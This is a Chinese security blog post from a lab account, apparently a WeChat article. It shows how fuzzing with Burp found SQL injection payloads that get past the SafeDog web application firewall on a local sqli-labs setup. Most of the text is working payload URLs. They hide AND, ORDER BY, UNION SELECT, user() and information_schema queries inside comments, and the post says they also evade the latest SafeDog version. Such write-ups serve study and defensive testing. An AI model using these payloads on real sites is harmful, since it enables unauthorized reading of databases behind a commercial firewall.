<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/19gwgR8iHss1We8VGG81dQ)

  

  

星期五实验室

**阅读须知**

星期五实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息造成的直接或间接后果和损失，均由使用者本人负责。

  

星期五实验室拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经授权，不得用于其他。

 ![](http://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1A9eSovMjmg3vTs8uzRyicthuDpqskG1VEM5oAZ0VEFs822aickkgVrKyN4domWdEoxg7Z2OlkoWRVg/0?wx_fmt=png) ** 乌鸦安全 ** 专注于网络安全技术分享，红蓝对抗技术、免杀、反制、内网漫游、安全研究。 84篇原创内容   公众号

 ![](http://mmbiz.qpic.cn/mmbiz_png/EnGZNML8PgTBzuCFQUunZ4jfuP4an5hOIwb7xYClZUabXH79ibOp0XJoK4hMuMmZUrK11fYk2c8Axgbe5IJ1aQA/0?wx_fmt=png) ** 星期五实验室 ** 星期五实验室 51篇原创内容   公众号

  

**01**

**环境搭建**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/EnGZNML8PgSrQAXIbro8rBC8FKZ2H0MmRrxMgWupFk6aSXlIs3KLW9Ap9uWddyk1I48via5SPalT6QibJJVc08hQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

server2012+安全狗+sqli-lab+phpstudy2018

测试链接：

```
http://10.30.3.209/sqli/Less-2/?id=1 
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/EnGZNML8PgSrQAXIbro8rBC8FKZ2H0MmJBcUysjNJoibozmq1KdQrJoR50voAouJ5XG9cDDa4UGJkt5ST58icsnQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

  

**02**

**测试过程**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**内联注释绕过and**

测试and被拦截

```
http://10.30.3.209/sqli/Less-2/?id=1%20and%201=1
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

burp抓包开始fuzz

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

经过测试，发现有一些payload可以绕过and

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回显正常

```
http://10.30.3.209/sqli/Less-2/?id=1%20 /*!10442and*/ %201=1
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回显异常，存在注入点。

```
http://10.30.3.209/sqli/Less-2/?id=1%20 /*!10442and*/ %201=2
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**注释绕过order by**

直接输入order by被拦截

```
http://10.30.3.209/sqli/Less-2/?id=1 order by 1
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在order by中间设置变量值

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

填充一些垃圾字符，垃圾字符可以如下选择。为了减少爆破次数，这里长度设置为4-5，payload数量只有9072，设置1-5爆破的payload会更多。

```
/-@$&*~^`?
```

  

\![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

经过fuzz发现有很多payload可以绕过

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

order by fuzz结果如下

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

查看第三列回显正常

```
http://10.30.3.209/sqli/Less-2/?id=1 order/*////*/ by 3
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

查看第四列出现报错

```
http://10.30.3.209/sqli/Less-2/?id=1 order/*////*/ by 4
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**注释绕过union select** 

直接输入union select被拦截

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在union select中间设置变量值爆破

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

设置payload数量值范围为4-5，如果爆破不成功可以选择其它范围，比如4-10。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

fuzz发现有一些paylaod可以绕过

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

fuzz结果如下

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

随便选择一个payload测试

```
`http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*/$---*/select%201,2,3``http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*/~---*/select%201,2,3``http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*/~--@*/select%201,2,3`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

部分payload会出现报错

```
http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*/`--&*/select%201,2,3
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

把payload /`--& url编码后放入其中执行正常

```
http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,3
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**注释绕过敏感命令**

这里以user()为例，执行会被拦截

```
http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,user()
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里其实用上面那个过union select的paylaod就可以了

```
http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,user/*%2f%60--%26*/()
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

为了演示还是fuzz一下user()，burp抓包设置变量值

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

根据需要设置payload的取值范围

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

返回长度为906的为成功绕过安全狗的payload。  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

fuzz结果如下

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里例举几个成功绕过的payoad，如果出现报错需要将payload编码，比如/&//需要url编码。

```
`http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,user/*/@//*/()``http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,user/*/$//*/()``http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,user/*%2f%26%2f%2f*/()``http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,user/*/~//*/()`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**fuzz绕过information_schema.schemata**

查询数据库会被拦截

```
http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,group_concat(schema_name)%20from%20--+33333%0ainformation_schema./*!schemata*/
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在--+和%0a之间添加垃圾字符干扰

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

fuzz成功跑出一些payload

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

fuzz结果如下

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

以下为一些成功绕过的payload

```
`http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,group_concat(schema_name)%20from%20--+/*-/%0ainformation_schema./*!schemata*/``http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,group_concat(schema_name)%20from%20--+/%*-%0ainformation_schema./*!schemata*/``http://10.30.3.209/sqli/Less-2/?id=-1%20union%20/*%2f%60--%26*/select%201,2,group_concat(schema_name)%20from%20--+/*/*%0ainformation_schema./*!schemata*/`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

上面的payload也可以绕过最新的安全狗

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

**03**

**简单总结**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

使用注释可以绕过and，order by，union select，where等关键词

绕过information_schema.schemata需要换行+单行注释